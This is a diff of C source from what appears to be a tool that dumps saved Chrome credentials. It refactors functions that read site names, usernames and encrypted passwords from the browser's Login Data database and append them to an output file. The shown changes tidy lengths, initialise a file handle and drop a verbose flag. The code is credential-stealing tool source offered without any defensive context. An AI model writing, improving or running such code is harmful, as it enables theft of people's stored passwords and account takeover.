@@ -44,11 +44,16 @@ int fetch_sqlite_data(char **website, char **username, char **cipher_password, i
 		return -1;
 	}
 
-	safe_strcpy(*website, (char *)sqlite3_column_text(*stmt, 0), strlen(sqlite3_column_text(*stmt, 0)));
-	safe_strcpy(*username, (char *)sqlite3_column_text(*stmt, 1), strlen(sqlite3_column_text(*stmt, 1)));
-	memcpy(*cipher_password, (char *)sqlite3_column_blob(*stmt, 2), sqlite3_column_bytes(*stmt, 2));
-	(*cipher_password)[sqlite3_column_bytes(*stmt, 2)] = '\0';
-	*len_cipher_password = sqlite3_column_bytes(*stmt, 2);
+	size_t website_len = strlen(sqlite3_column_text(*stmt, 0));
+	safe_strcpy(*website, (char *)sqlite3_column_text(*stmt, 0), website_len);
+
+	size_t username_len = strlen(sqlite3_column_text(*stmt, 1));
+	safe_strcpy(*username, (char *)sqlite3_column_text(*stmt, 1), username_len);
+
+	int cipher_password_len = sqlite3_column_bytes(*stmt, 2);
+	memcpy(*cipher_password, (char *)sqlite3_column_blob(*stmt, 2), cipher_password_len);
+	(*cipher_password)[cipher_password_len] = '\0';
+	*len_cipher_password = cipher_password_len;
 
 	return 1;
 }
@@ -78,7 +83,7 @@ int get_chrome_creds(char *login_data_path, const char *output) {
 	int len_cipher_password;
 	char *plaintext_password;
 	
-	FILE *output_fd;
+	FILE *output_fd = NULL;
 	if(output != NULL) {
 		output_fd = fopen(output, "ab");
 	}
@@ -128,7 +133,7 @@ int get_chrome_creds(char *login_data_path, const char *output) {
  *
  * @return 1 on success, -1 on failure 
  */
-int dump_chrome(int verbose, const char *output_file) {
+int dump_chrome(const char *output_file) {
 	log_info("Starting Chrome dump ...\n");
 
 	int result = 0;
